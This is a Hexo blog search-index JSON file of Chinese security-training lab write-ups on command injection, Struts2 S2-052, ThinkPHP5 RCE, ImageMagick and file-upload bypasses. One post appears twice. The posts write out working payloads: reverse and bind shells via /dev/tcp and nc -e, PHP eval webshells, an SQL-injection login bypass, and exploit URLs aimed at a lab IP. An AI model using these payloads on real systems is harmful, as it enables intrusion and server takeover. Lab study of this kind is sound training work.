{"meta":{"title":"gwolfs的个人博客","subtitle":"","description":"","author":"gwolfs","url":"http://blog.ydq6.com","root":"/"},"pages":[{"title":"about","date":"2020-05-01T06:53:25.000Z","updated":"2020-05-01T06:53:25.212Z","comments":true,"path":"about/index.html","permalink":"http://blog.ydq6.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-04-30T13:34:01.000Z","updated":"2020-04-30T13:35:12.193Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ydq6.com/categories/index.html","excerpt":"","text":""},{"title":"schedule","date":"2020-05-01T12:08:21.000Z","updated":"2020-05-01T12:08:21.762Z","comments":true,"path":"schedule/index-1.html","permalink":"http://blog.ydq6.com/schedule/index-1.html","excerpt":"","text":""},{"title":"schedule","date":"2020-05-01T11:57:57.000Z","updated":"2020-05-01T11:57:57.665Z","comments":true,"path":"schedule/index.html","permalink":"http://blog.ydq6.com/schedule/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-04-30T13:35:30.000Z","updated":"2020-04-30T13:35:56.646Z","comments":true,"path":"tags/index.html","permalink":"http://blog.ydq6.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"合天培训_实验_sql注入","slug":"合天培训-实验-sql注入","date":"2020-05-01T09:00:13.000Z","updated":"2020-05-01T09:03:39.198Z","comments":true,"path":"web/合天培训-实验-sql注入/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"命令执行实验gwolfs [toc] 1. 命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401 实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。 2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。 尝试127.0.0.1 3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。 4）构造payload 127.0.0.1 | net user 查看用户 127.0.0.1 | echo ““ &gt; 1.php 写php文件 127.0.0.1 | echo ““ &gt; shell.php 写shell 用菜刀连接 由于实验机里没有nc工具就不尝试反弹shell了。 5)medium难度操作 通过fuzz发现&amp;&amp;和;被过滤了。 127.0.0.1;dir 127.0.0.1 &amp;&amp; dir 但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的| 如果非要用&amp;&amp;可以使用下面方式： 1127.0.0.1 &amp;;&amp; dir 所以medium存在问题是使用黑名单，且黑名单机制不全。 2. CVE-2017-9805Struts2-052漏洞实验（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2 实验来源：合天网安实验室 实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术 （2）实验操作 1）搭建实验环境。 tomcat开启。下载软件源代码，部署war文件。打开 http://127.0.0.1:8080/struts2-rest-showcase 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。 2）正常业务 点击edit，随便输入内容提交，成功提交。 3）poc测试 发现报错500，rce成功。而且弹出了计算器。 4）漏洞分析 XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。 5）poc分析 poc: 123456&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; &lt;dataHandler&gt; &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; &lt;is class=\"javax.crypto.CipherInputStream\"&gt; &lt;cipher class=\"javax.crypto.NullCipher\"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; &lt;next class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;cacl&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=\"string\"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;&lt;/entry&gt;&lt;/map&gt; poc看不懂，分析是传入xml文件，估计下面语句 1&lt;command&gt;&lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt;&lt;/command&gt; 被当作命令执行。 3. Thinkphp5 远程命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 （2）实验操作 1）安装环境。 利用netstat -tunlp检测是否开启AMP。注意php端口为9000。 下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。 2）实验操作 直接利用实验里带的ThinkPHP5漏洞检测工具。 发现poc。 1index.php?s=/index/\\think\\request\\cache&amp;key=1|phpinfo 测试 发现正确。然后getshell. 3）漏洞分析 a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]，所以可以通过控制输入的参数s来控制pathinfo. b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。 c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。 问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。 e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。 4）poc poc不懂。。。 4. ImageMagick漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法 （2）实验操作 1）检查ImageMagick版本 版本号为6.8.9. 2）漏洞测试 创建exploit.png,其内容为： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|ls \"-la)'pop graphic-context 利用convert生成新文件： 1convert exploit.png out.png 可以发现成功执行了ls -a命令。证明存在命令执行漏洞。 3）漏洞利用 在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。 发现是用的ImageMagick工具转换的。 先下载 nc，并在本地开启监听。 1nc.exe -nvlp 12301 上传一个可以弹shell的图片。图片内容： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1\")'pop graphic-context 上传后shell反弹成功。 4）漏洞分析 ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为： 1\"wget\" -q -O \"%o\" \"https:%M\" 而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。 5.web安全之命令执行漏洞理解A.rce_ping（1）正常业务 1127.0.0.1 有回显。 （2）fuzz测试。 首先抓包 发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如 123exec($_POST['submit'].\" \".$_POST['ipaddress'],$return);echo $return;echo system($_POST['submit'].\" \".$_POST['ipaddress']);echo shell_exec($_POST['submit'].\" \".$_POST['ipaddress']); 为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。 （3）由于没有任何过滤所以直接写shell。 1ipaddress=127.0.0.1 | echo \"&lt;?php @eval($_POST['cmd']); ?&gt;\" &gt; shell.php &amp; submit=ping 尝试连接： 发现失败，估计没有写的权限。 （4）尝试shell a.正向shell 服务器 1ipaddress=127.0.0.1 | nc -lvp 7777 -e /bin/bash 本机 1nc 47.105.75.177 7777 正向shell成功。 b.反弹shell 本机(自己的服务器)： 1nc -lk 7777 远程服务器 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxxx/7777 0&gt;&amp;1 发现反弹不成功。 换台服务器尝试 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxx/7777 0&gt;&amp;1 反弹shell成功。 B.rce_ping_2直接fuzz测试。 发现; &amp;&amp;被过滤了。 直接正向shell测试。 服务器 1ipaddress=127.0.0.1 | nc -lvp 7778 -e /bin/bash 本机 1nc 47.105.75.177 7778 c.rce_ping_3同样fuzz测试。 发现过滤了&amp; ;同第三关一样的测试即可。 D.rce_ping_4页面500 E.code规定三种能力。（1）列出目录（2）写shell (3)反弹shell a.array_filterarray_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) （1）列出目录 1func=system&amp;cmd=ls 成功列举目录 （2）写shell 1func=system&amp;echo \"&lt;?php $_POST[pass]&gt; ?&gt;\" &gt; shell.php 发现还是不能上传shell???这里想探究下。 当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。 (3)反弹shell。 1func=system&amp;cmd=nc -lvp 7781 -e /bin/bash 反弹成功。 b. array_maparray_map原型 1array_map ( callable $callback , array $array1 [, array $... ] ) 同样直接 1func=exec&amp;nc -lvp 7782 -e /bin/bash c.assertassert原型 1assert ( mixed $assertion [, string $description ] ) payload: 1shell_exec('nc -lvp 7783 -e /bin/bash') d.call_user_func函数原型 1call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 列举目录下文件： 1func=passthru&amp;cmd=ls payload: 1func=passthru&amp;cmd=nc -lvp 7784 -e /bin/bash e.create_funccreate_function ( string $args , string $code ) 同样payload: 1func=passthru&amp;cmd=nc -lvp 7785 -e /bin/bash 发现500了。。。。。。 f.evaleval ( string $code ) 直接shell。 1system('nc -lvp 31321 -e /bin/bash') 连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。 1system('nc -lvp 31321 -e /bin/bash'); 成功反弹shell。 g preg_replace1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 直接cmd=phpinfo(); 反弹shell。 1system('nc -lvp 31322 -e /bin/bash'); h preg_replace2可以在双引号中使用 1&#123;$&#123;代码&#125;&#125; 来执行代码 只能列出目录， 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system(ls)&#125;&#125;[/php] 正向shell出问题了。 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system('nc -lvp 31322 -e /bin/bash')&#125;&#125;[/php] F.sys由于题目较多，所以只进行简单的测试。 com 500错误 exec ls exec_l ls 发现会以数组的形式返回。 fyh ls passthru ls -a popen ls popen_l ls 没反应。此题不会。。。 shell_exec ls system ls G.ThinkPHP V5框架漏洞首先用dirsearch扫描， 发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22. 可以用云悉探测。 搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围： 1ThinkPHP 5.0系列 &lt;5.0.23，ThinkPHP 5.1系列&lt; 5.1.31，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。 所以直接利用 1index.php?s=/index/\\think\\request/cache&amp;key=1|phpinfo 发现不成功。 利用网上的Poc 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 利用成功 正确写shell姿势 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[\"code\"])?^&gt;&gt;shell.php 尝试正向shell。 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=nc -lvp 31328 -e /bin/bash 正向shell成功。","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"}]},{"title":"合天培训_实验_命令执行","slug":"合天培训-实验-命令执行","date":"2020-05-01T08:53:17.000Z","updated":"2020-05-01T09:03:58.545Z","comments":true,"path":"web/合天培训-实验-命令执行/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"命令执行实验gwolfs [toc] 1. 命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401 实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。 2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。 尝试127.0.0.1 3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。 4）构造payload 127.0.0.1 | net user 查看用户 127.0.0.1 | echo ““ &gt; 1.php 写php文件 127.0.0.1 | echo ““ &gt; shell.php 写shell 用菜刀连接 由于实验机里没有nc工具就不尝试反弹shell了。 5)medium难度操作 通过fuzz发现&amp;&amp;和;被过滤了。 127.0.0.1;dir 127.0.0.1 &amp;&amp; dir 但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的| 如果非要用&amp;&amp;可以使用下面方式： 1127.0.0.1 &amp;;&amp; dir 所以medium存在问题是使用黑名单，且黑名单机制不全。 2. CVE-2017-9805Struts2-052漏洞实验（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2 实验来源：合天网安实验室 实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术 （2）实验操作 1）搭建实验环境。 tomcat开启。下载软件源代码，部署war文件。打开 http://127.0.0.1:8080/struts2-rest-showcase 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。 2）正常业务 点击edit，随便输入内容提交，成功提交。 3）poc测试 发现报错500，rce成功。而且弹出了计算器。 4）漏洞分析 XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。 5）poc分析 poc: 123456&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; &lt;dataHandler&gt; &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; &lt;is class=\"javax.crypto.CipherInputStream\"&gt; &lt;cipher class=\"javax.crypto.NullCipher\"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; &lt;next class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;cacl&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=\"string\"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;&lt;/entry&gt;&lt;/map&gt; poc看不懂，分析是传入xml文件，估计下面语句 1&lt;command&gt;&lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt;&lt;/command&gt; 被当作命令执行。 3. Thinkphp5 远程命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 （2）实验操作 1）安装环境。 利用netstat -tunlp检测是否开启AMP。注意php端口为9000。 下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。 2）实验操作 直接利用实验里带的ThinkPHP5漏洞检测工具。 发现poc。 1index.php?s=/index/\\think\\request\\cache&amp;key=1|phpinfo 测试 发现正确。然后getshell. 3）漏洞分析 a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]，所以可以通过控制输入的参数s来控制pathinfo. b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。 c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。 问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。 e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。 4）poc poc不懂。。。 4. ImageMagick漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法 （2）实验操作 1）检查ImageMagick版本 版本号为6.8.9. 2）漏洞测试 创建exploit.png,其内容为： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|ls \"-la)'pop graphic-context 利用convert生成新文件： 1convert exploit.png out.png 可以发现成功执行了ls -a命令。证明存在命令执行漏洞。 3）漏洞利用 在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。 发现是用的ImageMagick工具转换的。 先下载 nc，并在本地开启监听。 1nc.exe -nvlp 12301 上传一个可以弹shell的图片。图片内容： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1\")'pop graphic-context 上传后shell反弹成功。 4）漏洞分析 ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为： 1\"wget\" -q -O \"%o\" \"https:%M\" 而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。 5.web安全之命令执行漏洞理解A.rce_ping（1）正常业务 1127.0.0.1 有回显。 （2）fuzz测试。 首先抓包 发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如 123exec($_POST['submit'].\" \".$_POST['ipaddress'],$return);echo $return;echo system($_POST['submit'].\" \".$_POST['ipaddress']);echo shell_exec($_POST['submit'].\" \".$_POST['ipaddress']); 为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。 （3）由于没有任何过滤所以直接写shell。 1ipaddress=127.0.0.1 | echo \"&lt;?php @eval($_POST['cmd']); ?&gt;\" &gt; shell.php &amp; submit=ping 尝试连接： 发现失败，估计没有写的权限。 （4）尝试shell a.正向shell 服务器 1ipaddress=127.0.0.1 | nc -lvp 7777 -e /bin/bash 本机 1nc 47.105.75.177 7777 正向shell成功。 b.反弹shell 本机(自己的服务器)： 1nc -lk 7777 远程服务器 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxxx/7777 0&gt;&amp;1 发现反弹不成功。 换台服务器尝试 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxx/7777 0&gt;&amp;1 反弹shell成功。 B.rce_ping_2直接fuzz测试。 发现; &amp;&amp;被过滤了。 直接正向shell测试。 服务器 1ipaddress=127.0.0.1 | nc -lvp 7778 -e /bin/bash 本机 1nc 47.105.75.177 7778 c.rce_ping_3同样fuzz测试。 发现过滤了&amp; ;同第三关一样的测试即可。 D.rce_ping_4页面500 E.code规定三种能力。（1）列出目录（2）写shell (3)反弹shell a.array_filterarray_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) （1）列出目录 1func=system&amp;cmd=ls 成功列举目录 （2）写shell 1func=system&amp;echo \"&lt;?php $_POST[pass]&gt; ?&gt;\" &gt; shell.php 发现还是不能上传shell???这里想探究下。 当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。 (3)反弹shell。 1func=system&amp;cmd=nc -lvp 7781 -e /bin/bash 反弹成功。 b. array_maparray_map原型 1array_map ( callable $callback , array $array1 [, array $... ] ) 同样直接 1func=exec&amp;nc -lvp 7782 -e /bin/bash c.assertassert原型 1assert ( mixed $assertion [, string $description ] ) payload: 1shell_exec('nc -lvp 7783 -e /bin/bash') d.call_user_func函数原型 1call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 列举目录下文件： 1func=passthru&amp;cmd=ls payload: 1func=passthru&amp;cmd=nc -lvp 7784 -e /bin/bash e.create_funccreate_function ( string $args , string $code ) 同样payload: 1func=passthru&amp;cmd=nc -lvp 7785 -e /bin/bash 发现500了。。。。。。 f.evaleval ( string $code ) 直接shell。 1system('nc -lvp 31321 -e /bin/bash') 连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。 1system('nc -lvp 31321 -e /bin/bash'); 成功反弹shell。 g preg_replace1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 直接cmd=phpinfo(); 反弹shell。 1system('nc -lvp 31322 -e /bin/bash'); h preg_replace2可以在双引号中使用 1&#123;$&#123;代码&#125;&#125; 来执行代码 只能列出目录， 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system(ls)&#125;&#125;[/php] 正向shell出问题了。 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system('nc -lvp 31322 -e /bin/bash')&#125;&#125;[/php] F.sys由于题目较多，所以只进行简单的测试。 com 500错误 exec ls exec_l ls 发现会以数组的形式返回。 fyh ls passthru ls -a popen ls popen_l ls 没反应。此题不会。。。 shell_exec ls system ls G.ThinkPHP V5框架漏洞首先用dirsearch扫描， 发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22. 可以用云悉探测。 搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围： 1ThinkPHP 5.0系列 &lt;5.0.23，ThinkPHP 5.1系列&lt; 5.1.31，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。 所以直接利用 1index.php?s=/index/\\think\\request/cache&amp;key=1|phpinfo 发现不成功。 利用网上的Poc 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 利用成功 正确写shell姿势 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[\"code\"])?^&gt;&gt;shell.php 尝试正向shell。 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=nc -lvp 31328 -e /bin/bash 正向shell成功。","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"合天培训_实验_上传文件考核","slug":"合天培训-实验-文件上传考核","date":"2020-05-01T08:50:32.000Z","updated":"2020-05-01T09:04:17.842Z","comments":true,"path":"web/合天培训-实验-文件上传考核/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/","excerpt":"","text":"1.beecms首先后台登录 绕过登录方法： 12用户名：admi' Un union ion Se%select%lect 1,'admin','9003d1df22eb4d3820015070385194c8',4,0 #密码：pwd 在后台发现上传图片功能： 1http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=add&amp;id=3&amp;nav=add_channel_product&amp;admin_p_nav=content&amp;lang=cn 实际检测，发现是MIME白名单检测，所以Burp改包即可。 然后在图片管理中可以看到上传的文件的路径： 1/vulnlab/sqli/beecms/upload/img/202004201359505400.php 2.fiyocms账户密码admin/admin888登录 找到上传文件的点： 1http://47.105.75.177/vulnlab/upload/fiyocms/dapur/?app=media&amp;type=files 但是上传按钮按不动。其他功能点也没有上传的，放弃。 老师讲了后发现themes下面有漏洞。 （1）任意文件读取 （2）任意文件上传 3.phpok账户密码admin/admin登录 找到修改头像的点，发现只能上传图像。 上传一个后缀名改为gif的php代码。 然后改包： 发现php被过滤了。 php fuzz测试。发现均被过滤了。 换思路，扫后台 扫出admin.php 登录发现不正确，应该用户表和管理员表是两张。 用户名：admin,密码： admin888 (利用其他网站的sql注入获得) 在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。 看burp包得到上传路径： 1res/202004/20/1555e119f9dc2b1f.php 访问资源即可： 1http://47.105.75.177/vulnlab/upload/phpok/res/202004/20/1555e119f9dc2b1f.php 为了方便其他同学做再改回去。 geez同样sql注入得到账户名密码：admin/admin445 发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。 然后在主页再检查头像的地址： 得到上传文件： 1./upload/1_dama1.php. 访问： 1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php. 发现不能解析。 改为大小写绕过得到上传文件： 1./upload/1_dama1.php 访问： 